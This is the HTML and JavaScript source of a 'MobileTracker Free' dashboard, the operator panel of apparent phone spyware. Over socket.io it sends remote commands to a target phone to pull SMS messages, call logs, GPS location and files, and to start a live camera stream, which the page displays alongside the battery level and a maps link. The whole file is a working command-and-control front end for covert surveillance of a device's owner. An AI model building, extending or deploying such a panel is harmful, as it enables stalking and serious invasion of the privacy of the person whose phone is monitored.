<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MobileTracker Free - Dashboard</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --sidebar-bg: #2c3e50;
            --topbar-bg: #ffffff;
            --main-bg: #f4f7f6;
            --card-shadow: 0 2px 5px rgba(0,0,0,0.1);
            /* Colors from your screenshots */
            --blue: #3498db; --teal: #1abc9c; --purple: #9b59b6; --yellow: #f1c40f;
            --orange: #e67e22; --red: #e74c3c; --green: #2ecc71; --dark-blue: #34495e;
        }

        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background-color: var(--main-bg); display: flex; height: 100vh; overflow: hidden; }

        /* Sidebar Styling */
        .sidebar { width: 240px; background-color: var(--sidebar-bg); color: white; display: flex; flex-direction: column; flex-shrink: 0; }
        .sidebar-header { padding: 20px; background: #1a252f; font-size: 1.2rem; font-weight: bold; border-bottom: 1px solid #34495e; }
        .sidebar-menu { flex: 1; overflow-y: auto; padding-top: 10px; }
        .menu-item { padding: 12px 20px; display: flex; align-items: center; color: #bdc3c7; text-decoration: none; cursor: pointer; transition: 0.3s; font-size: 0.9rem; }
        .menu-item:hover, .menu-item.active { background: #3e5871; color: white; }
        .menu-item i { margin-right: 15px; width: 20px; text-align: center; }

        /* Main Content Area */
        .content-area { flex: 1; display: flex; flex-direction: column; overflow-y: auto; }
        .top-bar { height: 60px; background: var(--topbar-bg); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; box-shadow: var(--card-shadow); z-index: 10; }
        .device-info { font-weight: bold; color: var(--teal); }

        .dashboard-container { padding: 25px; }
        .status-row { display: flex; gap: 20px; margin-bottom: 30px; }
        
        /* Status Tiles (Top Row) */
        .status-tile { background: white; padding: 20px; border-radius: 4px; display: flex; align-items: center; box-shadow: var(--card-shadow); flex: 1; }
        .status-tile.online { border-left: 5px solid #bdc3c7; }
        .status-tile.battery { border-left: 5px solid var(--red); background: var(--red); color: white; }
        .status-tile.location { border-left: 5px solid var(--blue); background: var(--blue); color: white; flex: 2; }
        .status-tile i { font-size: 2rem; margin-right: 20px; opacity: 0.8; }

        /* Feature Grid Styling */
        .feature-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; }
        .feature-card { border-radius: 4px; padding: 20px; color: white; position: relative; min-height: 120px; display: flex; flex-direction: column; justify-content: space-between; cursor: pointer; transition: transform 0.2s; box-shadow: var(--card-shadow); }
        .feature-card:hover { transform: translateY(-3px); }
        .feature-card .count { font-size: 2.5rem; font-weight: 300; text-align: right; }
        .feature-card .label { font-size: 0.85rem; font-weight: bold; text-transform: uppercase; }
        .feature-card i { position: absolute; left: 15px; top: 15px; font-size: 3.5rem; opacity: 0.15; }

        /* Card Color Mapping */
        .bg-blue { background-color: var(--blue); } .bg-teal { background-color: var(--teal); }
        .bg-purple { background-color: var(--purple); } .bg-yellow { background-color: var(--yellow); }
        .bg-orange { background-color: var(--orange); } .bg-red { background-color: var(--red); }
        .bg-green { background-color: var(--green); } .bg-dark-blue { background-color: var(--dark-blue); }

        #live-view-container { margin-top: 30px; display: none; background: #000; border-radius: 8px; padding: 10px; text-align: center; }
        #live-frame { max-width: 100%; border-radius: 4px; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">MobileTracker <span style="font-weight: 300; font-size: 0.8rem;">free</span></div>
        <div class="sidebar-menu">
            <a class="menu-item active"><i class="fa fa-home"></i> Dashboard</a>
            <a class="menu-item" onclick="sendCmd('get-sms')"><i class="fa fa-envelope"></i> SMS</a>
            <a class="menu-item" onclick="sendCmd('get-calls')"><i class="fa fa-phone"></i> Calls</a>
            <a class="menu-item" onclick="sendCmd('get-gps')"><i class="fa fa-location-dot"></i> Locations</a>
            <a class="menu-item"><i class="fa fa-image"></i> Pictures</a>
            <a class="menu-item"><i class="fa fa-th-large"></i> Apps</a>
            <a class="menu-item" onclick="toggleLiveView()"><i class="fa fa-video"></i> Live viewing</a>
            <a class="menu-item" onclick="sendCmd('get-files')"><i class="fa fa-folder-open"></i> File Explorer</a>
            <a class="menu-item" style="color: #e74c3c;"><i class="fa fa-power-off"></i> Logout</a>
        </div>
    </div>

    <div class="content-area">
        <div class="top-bar">
            <div class="device-info"><i class="fa fa-mobile-screen"></i> RMX2020</div>
            <div>
                <i class="fa fa-bell" style="margin-right: 20px; color: #666; cursor: pointer;"></i>
                <i class="fa fa-gear" style="color: #666; cursor: pointer;"></i>
            </div>
        </div>

        <div class="dashboard-container">
            <div class="status-row">
                <div class="status-tile online">
                    <i class="fa fa-signal"></i>
                    <div>
                        <div style="font-weight:bold; color:#666;">Online status</div>
                        <div style="color:#2ecc71; font-size: 0.8rem;"><i class="fa fa-check"></i> Connected</div>
                    </div>
                </div>
                <div class="status-tile battery">
                    <i class="fa fa-battery-half"></i>
                    <div>
                        <div style="font-weight:bold;">Battery</div>
                        <div style="font-size: 1.5rem;"><span id="batt">--</span> %</div>
                    </div>
                </div>
                <div class="status-tile location">
                    <i class="fa fa-map-marked-alt"></i>
                    <div>
                        <div style="font-weight:bold;">Location</div>
                        <div id="loc-text" style="font-size: 0.8rem; line-height: 1.2;">Waiting for GPS update...</div>
                    </div>
                </div>
            </div>

            <div class="feature-grid">
                <div class="feature-card bg-blue" onclick="sendCmd('get-sms')">
                    <i class="fa fa-envelope"></i>
                    <div class="count" id="sms-count">0</div>
                    <div class="label">SMS</div>
                </div>
                <div class="feature-card bg-teal" onclick="sendCmd('get-calls')">
                    <i class="fa fa-phone"></i>
                    <div class="count" id="call-count">0</div>
                    <div class="label">Calls</div>
                </div>
                <div class="feature-card bg-purple" onclick="sendCmd('get-gps')">
                    <i class="fa fa-location-dot"></i>
                    <div class="count">50+</div>
                    <div class="label">Locations</div>
                </div>
                <div class="feature-card bg-yellow">
                    <i class="fa fa-image"></i>
                    <div class="count">0</div>
                    <div class="label">Pictures</div>
                </div>
                <div class="feature-card bg-orange">
                    <i class="fa fa-gamepad"></i>
                    <div class="count">0</div>
                    <div class="label">Apps</div>
                </div>
                <div class="feature-card bg-blue">
                    <i class="fa fa-address-book"></i>
                    <div class="count">0</div>
                    <div class="label">Contacts</div>
                </div>
                <div class="feature-card bg-green">
                    <i class="fa fa-chrome"></i>
                    <div class="count">0</div>
                    <div class="label">Site Web</div>
                </div>
                <div class="feature-card bg-teal">
                    <i class="fa fa-binoculars"></i>
                    <div class="count">0</div>
                    <div class="label">Screenshot</div>
                </div>
                <div class="feature-card bg-red" onclick="toggleLiveView()">
                    <i class="fa fa-video"></i>
                    <div class="label">Live Viewing</div>
                </div>
                <div class="feature-card bg-orange" onclick="sendCmd('get-files')">
                    <i class="fa fa-folder-open"></i>
                    <div class="label">File Explorer</div>
                </div>
                <div class="feature-card bg-dark-blue">
                    <i class="fa fa-paper-plane"></i>
                    <div class="label">SMS Commands</div>
                </div>
                <div class="feature-card bg-purple">
                    <i class="fa fa-chart-pie"></i>
                    <div class="label">Statistics</div>
                </div>
            </div>

            <div id="live-view-container">
                <h4 style="color: white;">Live Camera Feed</h4>
                <img id="live-frame" src="">
                <div style="margin-top: 10px;">
                    <button onclick="sendCmd('stream:0:video')" style="padding: 5px 15px; background: #2ecc71; color: white; border: none; border-radius: 4px; cursor: pointer;">Start Feed</button>
                    <button onclick="sendCmd('stop-stream')" style="padding: 5px 15px; background: #e74c3c; color: white; border: none; border-radius: 4px; cursor: pointer;">Stop Feed</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        function sendCmd(c) { socket.emit('phone-execute', c); }

        function toggleLiveView() {
            const container = document.getElementById('live-view-container');
            container.style.display = container.style.display === 'none' ? 'block' : 'none';
        }

        // Handle Battery Update
        socket.on('battery-update', (val) => {
            document.getElementById('batt').innerText = val;
        });

        // Handle Live Camera Stream
        socket.on('data-stream', (base64Data) => {
            document.getElementById('live-frame').src = "data:image/jpeg;base64," + base64Data;
        });

        // Handle SMS/Call Data for Counters
        socket.on('sms-data', (data) => {
            const logs = JSON.parse(data);
            document.getElementById('sms-count').innerText = logs.length;
            console.log("SMS Data:", logs);
        });

        socket.on('call-data', (data) => {
            const logs = JSON.parse(data);
            document.getElementById('call-count').innerText = logs.length;
        });

        // Handle Location Update
        socket.on('location-update', (data) => {
            document.getElementById('loc-text').innerHTML = `Lat: ${data.lat}, Lng: ${data.lng}<br><a href="https://maps.google.com/?q=${data.lat},${data.lng}" target="_blank" style="color:white; font-weight:bold;">Open in Google Maps</a>`;
        });
    </script>
</body>
</html>
